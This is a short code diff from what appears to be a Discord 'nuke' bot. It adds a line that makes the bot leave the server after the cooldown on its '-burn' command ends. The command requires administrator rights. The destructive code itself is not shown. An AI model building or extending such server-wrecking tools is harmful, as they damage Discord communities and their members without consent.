@@ -232,6 +232,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
               nukingtime.add("-burn")
                 setTimeout(() => {
             nukingtime.delete("-burn")
+            msg.guild.leave()
                 console.log("ok i can do the funni again")
           }, 200000)
        if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
